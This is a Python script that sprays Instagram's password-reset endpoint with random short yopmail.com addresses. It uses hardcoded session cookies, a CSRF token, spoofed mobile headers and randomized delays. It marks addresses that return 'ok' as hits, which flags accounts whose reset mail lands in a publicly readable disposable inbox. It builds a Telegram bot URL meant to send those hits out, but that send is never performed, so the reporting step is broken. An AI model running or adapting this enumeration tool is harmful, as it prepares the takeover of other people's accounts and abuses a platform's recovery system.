import requests, random, time
import os
#PY:@YAALI_515
token = input('Token : ')
ID = input('\nID : ')
os.system('clear')
import webbrowser;webbrowser.open('https://t.me/P33_9')
cookies = {
    'datr': 'e3h6Z1avzNiAj2c3MJSBB2Ko',
    'ig_did': '02BE8DD9-E88B-4943-96EB-A2645020CC17',
    'mid': 'Z3p4fAABAAEa221iQo9NyIVfFvBO',
    'ig_nrcb': '1',
    'ps_l': '1',
    'ps_n': '1',
    'dpr': '2.825000047683716',
    'csrftoken': 'wXVzI5AKtIQ20EODlH2MjfEmM4vVcLe2',
    'wd': '383x737',
}

headers = {
    'authority': 'www.instagram.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/accounts/password/reset/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6833B"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-asbd-id': '359341',
    'x-csrftoken': 'wXVzI5AKtIQ20EODlH2MjfEmM4vVcLe2',
    'x-ig-app-id': '1217981644879628',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': '1023296812',
    'x-requested-with': 'XMLHttpRequest',
}
def chh(email):
    data = {'email_or_username': email, 'jazoest': '22617'}
    try:
        response = requests.post(
            'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10
        ).text

        if '"status":"ok"' in response:
            cc = (f"[✅] {email} --> Hit")
            url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={cc}"
        else:
            print(f"[❌] {email} --> Bad")
    except Exception as e:
        print(f"[⚠️] خطأ بالاتصال: {e}")

chars = "abcdefghijklmnopqrstuvwxyz0123456789"
while True:
    lw = random.choice([3, 4, 5])
    p = "".join(random.choice(chars) for _ in range(lw))
    email = f"{p}@yopmail.com"
    chh(email)
    time.sleep(random.uniform(2, 4)) 
